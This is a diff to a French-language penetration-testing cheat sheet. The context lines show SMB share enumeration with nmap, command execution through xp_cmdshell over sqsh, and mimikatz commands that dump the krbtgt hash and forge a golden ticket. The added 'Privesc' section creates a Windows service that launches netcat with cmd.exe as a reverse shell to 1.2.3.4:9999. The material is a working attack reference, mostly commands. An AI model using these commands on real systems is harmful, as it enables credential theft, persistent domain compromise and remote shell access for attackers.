@@ -60,7 +60,6 @@ nmap -v --script smb-enum-shares -p U:137,T:139 host
 
 #### sqsh
 
-
 ```
 sqsh -S 1.2.3.4 -u user
 EXEC master..xp_cmdshell 'whoami'
@@ -80,3 +79,12 @@ go
 `lsadump::lsa /inject /name:krbtgt` → Récupérer le NTLM hash de krbtgt
 
 `kerberos::golden /user:[USER] /domain:[DOMAINE] /sid:[SID de USER] /krbtgt:[NTLM hash de krbtgt] /ticket:evil.tck /ptt` → Créé et inject un golden ticket à la session
+
+## Privesc
+
+Créer un service:
+
+```
+sc create cmdsvc type=own type=interact binpath="C:\tmp\nc64.exe 1.2.3.4 9999 -e cmd"
+sc cmdsvc start
+```
